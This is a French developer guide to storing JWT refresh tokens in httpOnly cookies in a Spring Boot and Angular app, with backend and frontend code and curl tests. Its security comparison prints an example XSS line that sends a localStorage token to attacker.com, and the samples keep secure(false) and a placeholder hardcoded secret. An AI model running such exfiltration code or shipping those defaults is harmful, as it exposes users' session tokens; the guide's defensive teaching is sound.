# 🔐 httpOnly Cookies - JWT Refresh Token Secure Implementation

## ✨ Mise à jour v2.0 : Tokens Sécurisés

**Refresh tokens sont maintenant protégés avec httpOnly cookies !**

---

## 🎯 Résumé des Changements

| Aspect                     | Avant (v1) 🚨          | Après (v2) ✅            |
| -------------------------- | ---------------------- | ------------------------ |
| **Stockage refresh token** | localStorage           | httpOnly Cookie          |
| **Accessibilité JS**       | ✅ Possible (XSS risk) | ❌ Impossible (sécurisé) |
| **Envoi auto**             | ❌ Manuel              | ✅ Automatique           |
| **Gestion locale**         | ComplexeFacile         | Très facile              |
| **Sécurité XSS**           | Très risqué            | Protégé                  |
| **Sécurité CSRF**          | À gérer manuellement   | Automatique (SameSite)   |

---

## 📋 Nouveau Flux de Login

```
1. User → POST /auth/login
   ↓
2. Backend valide credentials (BCrypt)
   ↓
3. Génère:
   - accessToken: JWT signé (15 min)
   - refreshToken: UUID stocké en DB (7 jours)
   ↓
4. RESPONSE:
   {
     "accessToken": "eyJhbGc...",
     "expiresIn": 900
   }
   Set-Cookie: refreshToken=uuid; HttpOnly; Secure; SameSite=Lax; Path=/auth
   ↓
5. Frontend:
   - localStorage['access_token'] = accessToken
   - Cookie est géré par le navigateur (JS ne peut pas le toucher!)
```

---

## 📋 Flux d'Auto-Refresh

```
Requête API:
  ↓
GET /api/dashboard
Authorization: Bearer <accessToken>
(+ httpOnly cookie envoyé automatiquement)
  ↓
  Résultat: 401 (token expiré)
  ↓
Interceptor catch 401:
  ↓
POST /auth/refresh
  - Body: {} (vide)
  - Cookies: httpOnly refreshToken envoyé automatiquement ✅
  ↓
Backend lit le cookie:
  ↓
  Valide refreshToken
  ↓
  Génère nouveau accessToken
  ↓
RESPONSE:
{
  "accessToken": "new-jwt...",
  "expiresIn": 900
}
  ↓
Frontend met à jour localStorage['access_token']
  ↓
Retry requête originale
  ↓
Success! ✅
```

---

## 🔐 Sécurité : Comparaison localStorage vs httpOnly

### localStorage (Avant) 🚨

```javascript
// ❌ JavaScript peut accéder
localStorage.getItem("refresh_token"); // → "uuid-value"

// ❌ XSS attack possible
fetch(
  "https://attacker.com/steal?token=" + localStorage.getItem("refresh_token"),
);

// ❌ DevTools Console → voir le token
console.log(localStorage);
```

### httpOnly Cookie (Maintenant) ✅

```javascript
// ✅ JavaScript NE peut PAS accéder
document.cookie // Ne contient PAS le refreshToken!

// ✅ XSS attack IMPOSSIBLE
const cookies = document.cookie // → ""
// Le refreshToken n'est pas là!

// ✅ Automatiquement envoyé par le navigateur
// Pas besoin de JS pour envoyer le token
POST /auth/refresh
→ Cookie: refreshToken=uuid (navigateur le fait automatiquement)
```

---

## 🛠️ Implémentation Backend

### 1. AuthController - /login

```java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request, HttpServletResponse response) {
    // Validation credentials
    User user = authService.authenticate(request.getUsername(), request.getPassword());

    String accessToken = jwtUtil.generateAccessToken(user.getUsername());
    RefreshToken refreshToken = refreshTokenService.createRefreshToken(user.getUsername());

    // ✅ Créer cookie httpOnly
    ResponseCookie cookie = ResponseCookie
            .from("refreshToken", refreshToken.getToken())
            .httpOnly(true)      // ← JS ne peut pas accéder
            .secure(false)       // ← Changer à true en PROD (HTTPS)
            .path("/auth")       // ← Envoyé seulement pour /auth/*
            .maxAge(7 * 24 * 60 * 60) // ← 7 jours
            .sameSite("Lax")     // ← Protection CSRF
            .build();

    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    // Retourner seulement l'accessToken
    LoginResponse loginResponse = new LoginResponse(
            accessToken,
            null, // ← Pas le refresh token dans le body!
            jwtUtil.getAccessTokenExpirationTime() / 1000
    );

    return ResponseEntity.ok(loginResponse);
}
```

### 2. AuthController - /refresh

```java
@PostMapping("/refresh")
public ResponseEntity<?> refreshToken(HttpServletRequest request, HttpServletResponse response) {
    // ✅ Lire le cookie (navigateur l'envoie automatiquement)
    String refreshTokenValue = null;
    if (request.getCookies() != null) {
        for (jakarta.servlet.http.Cookie cookie : request.getCookies()) {
            if ("refreshToken".equals(cookie.getName())) {
                refreshTokenValue = cookie.getValue();
                break;
            }
        }
    }

    if (refreshTokenValue == null) {
        throw new RuntimeException("Refresh token not found in cookies");
    }

    // Valider le token
    RefreshToken refreshToken = refreshTokenService.findByToken(refreshTokenValue)
            .orElseThrow(() -> new RuntimeException("Invalid refresh token"));

    RefreshToken verifiedToken = refreshTokenService.verifyRefreshToken(refreshToken);

    String newAccessToken = jwtUtil.generateAccessToken(verifiedToken.getUser().getUsername());

    // ✅ Re-envoyer le cookie (mise à jour expiration)
    ResponseCookie cookie = ResponseCookie
            .from("refreshToken", verifiedToken.getToken())
            .httpOnly(true)
            .secure(false)
            .path("/auth")
            .maxAge(7 * 24 * 60 * 60)
            .sameSite("Lax")
            .build();

    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    return ResponseEntity.ok(new LoginResponse(
            newAccessToken,
            null, // ← Pas dans le body
            jwtUtil.getAccessTokenExpirationTime() / 1000
    ));
}
```

### 3. AuthController - /logout

```java
@PostMapping("/logout")
public ResponseEntity<?> logout(@RequestHeader("Authorization") String authHeader, HttpServletResponse response) {
    String token = authHeader.replace("Bearer ", "");
    String username = jwtUtil.extractUsername(token);
    refreshTokenService.deleteRefreshToken(username);

    // ✅ Supprimer le cookie (MaxAge=0)
    ResponseCookie cookie = ResponseCookie
            .from("refreshToken", "")
            .httpOnly(true)
            .secure(false)
            .path("/auth")
            .maxAge(0) // ← Delete the cookie
            .sameSite("Lax")
            .build();

    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    return ResponseEntity.ok(Map.of("message", "Logged out successfully"));
}
```

### 4. SecurityConfig - CORS

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    configuration.setAllowedOrigins(Arrays.asList("http://localhost:4200"));
    configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    configuration.setAllowedHeaders(Arrays.asList("*"));
    configuration.setAllowCredentials(true); // ✅ Important pour les cookies!

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    return source;
}
```

---

## 🎯 Implémentation Frontend

### 1. TokenService - Simplifié

```typescript
@Injectable({ providedIn: "root" })
export class TokenService {
  private readonly ACCESS_TOKEN_KEY = "access_token";

  setAccessToken(token: string): void {
    localStorage.setItem(this.ACCESS_TOKEN_KEY, token);
    // ✅ Pas besoin de gérer le refresh token
    // Le navigateur gère le cookie httpOnly
  }

  getAccessToken(): string | null {
    return localStorage.getItem(this.ACCESS_TOKEN_KEY);
  }

  clear(): void {
    localStorage.removeItem(this.ACCESS_TOKEN_KEY);
    // ✅ Le cookie est supprimé par le backend
  }

  // Note: getRefreshToken() n'existe plus - c'est dans le cookie!
}
```

### 2. AuthService - Refresh simplifié

```typescript
@Injectable({ providedIn: "root" })
export class AuthService {
  private apiUrl = "http://localhost:8080/auth";

  login(username: string, password: string) {
    return this.http.post<any>(
      `${this.apiUrl}/login`,
      { username, password },
      { withCredentials: true }, // ✅ Envoie les cookies
    );
  }

  // ✅ Plus simple! Pas de paramètre
  refreshToken() {
    return this.http.post<any>(
      `${this.apiUrl}/refresh`,
      {},
      { withCredentials: true }, // ✅ Envoie le cookie httpOnly
    );
  }

  logout() {
    return this.http.post<any>(
      `${this.apiUrl}/logout`,
      {},
      { withCredentials: true },
    );
  }
}
```

### 3. JwtInterceptor - Avec withCredentials

```typescript
export const jwtInterceptor: HttpInterceptorFn = (req, next) => {
  const tokenService = inject(TokenService);
  const authService = inject(AuthService);
  const router = inject(Router);

  // Ajouter le token et withCredentials
  const token = tokenService.getAccessToken();
  if (token) {
    req = req.clone({
      setHeaders: {
        Authorization: `Bearer ${token}`,
      },
      withCredentials: true, // ✅ Envoie les cookies!
    });
  } else {
    req = req.clone({
      withCredentials: true,
    });
  }

  return next(req).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401) {
        // ✅ Pas de paramètre - le cookie est envoyé automatiquement
        return authService.refreshToken().pipe(
          switchMap((response: any) => {
            tokenService.setAccessToken(response.accessToken);
            req = req.clone({
              setHeaders: {
                Authorization: `Bearer ${response.accessToken}`,
              },
            });
            return next(req);
          }),
          catchError((refreshError) => {
            tokenService.clear();
            router.navigate(["/auth/login"]);
            return throwError(() => refreshError);
          }),
        );
      }
      return throwError(() => error);
    }),
  );
};
```

### 4. Login Component

```typescript
onLogin(): void {
  this.authService.login(this.username, this.password).subscribe({
    next: (response) => {
      // ✅ Sauvegarder seulement le accessToken
      this.authService.saveToken(response.accessToken);
      // ✅ Le refresh token est dans le cookie (JS ne le voit pas)
      this.router.navigate(['/dashboard']);
    },
    error: (err) => {
      // Gestion d'erreur
    },
  });
}
```

---

## 🧪 Tests

### Test 1: Vérifier que le cookie est httpOnly

**DevTools → Application → Cookies → localhost:8080**

Après login, tu devrais voir:

- `refreshToken` (valeur: uuid)
- HttpOnly: ✅ (coché)
- Secure: ✅ (en PROD)
- SameSite: Lax

### Test 2: Vérifier que JS ne peut pas accéder

**DevTools → Console** :

```javascript
// Essayer d'accéder au cookie
console.log(document.cookie);
// → résultat: "" (vide!)
// Le refreshToken N'EST PAS visible

// Mais localStorage est visible
localStorage.getItem("access_token");
// → résultat: "eyJhbGc..."
```

### Test 3: Test du refresh automatique

```bash
# 1. Login
curl -X POST http://localhost:8080/auth/login \
  -d '{"username":"djilani","password":"pwd"}' \
  -c cookies.txt \
  -b cookies.txt | jq

# 2. Regarder le cookie
cat cookies.txt
# .refreshToken uuid-value

# 3. Test refresh (le cookie est envoyé automatiquement)
curl -X POST http://localhost:8080/auth/refresh \
  -b cookies.txt | jq

# Devrait retourner un nouvel accessToken
```

---

## ✅ Checklist de Vérification

| ✅  | Test                               | Expected                               |
| --- | ---------------------------------- | -------------------------------------- |
| ✓   | POST /login retourne cookie        | Set-Cookie: refreshToken=...; HttpOnly |
| ✓   | Cookie n'est PAS en localStorage   | document.cookie ne le contient pas     |
| ✓   | accessToken EST en localStorage    | localStorage.getItem('access_token')   |
| ✓   | Interceptor ajoute Authorization   | Headers contiennent Bearer token       |
| ✓   | Interceptor ajoute withCredentials | Cookies envoyés automatiquement        |
| ✓   | 401 → auto-refresh                 | POST /auth/refresh appelé auto         |
| ✓   | Refresh envoie le cookie           | Headers contiennent le cookie          |
| ✓   | Nouveau token reçu                 | accessToken mis à jour                 |
| ✓   | Requête retry réussie              | Originale request succeed              |
| ✓   | Logout supprime cookie             | Set-Cookie: refreshToken=; MaxAge=0    |

---

## ⚙️ Configuration pour la PRODUCTION

### Backend (SecurityConfig.java)

```java
// ✅ Changer secure=true (HTTPS obligatoire)
.secure(true)

// ✅ Ajouter la vraie origine
configuration.setAllowedOrigins(Arrays.asList("https://yourdomain.com"));

// ✅ Utiliser une vraie clé JWT secrète
private final String SECRET = "your-super-secret-256-bit-key";
```

### Frontend (environment.prod.ts)

```typescript
export const environment = {
  production: true,
  apiUrl: "https://api.yourdomain.com", // HTTPS!
};
```

---

## 🎓 Résumé

### Avantages de cette implémentation

✅ **Sécurité XSS** : httpOnly cookies ne peuvent pas être accédés par JavaScript malveillant

✅ **Automatique** : Pas besoin de gérer manuellement l'envoi du refresh token

✅ **SameSite Protection** : Protection CSRF automatique

✅ **Séparation des responsabilités** :

- accessToken (court-vivant) = localStorage
- refreshToken (long-vivant) = httpOnly cookie

✅ **Standards web** : Suit les bonnes pratiques de l'industrie

### Points clés à retenir

1. **Jamais envoyer le refresh token dans le response body** (v1)
2. **Toujours utiliser httpOnly pour les tokens sensibles**
3. **Toujours utiliser `withCredentials: true`** pour les cookies
4. **SameSite=Lax/Strict** pour CSRF protection
5. **HTTPS obligatoire en production** (secure=true)

---

## 📚 Références

- [MDN - HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#httponly)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Spring Security - CSRF Protection](https://spring.io/guides/tutorials/spring-security-and-angular-js/#_custom_authentication_objects)
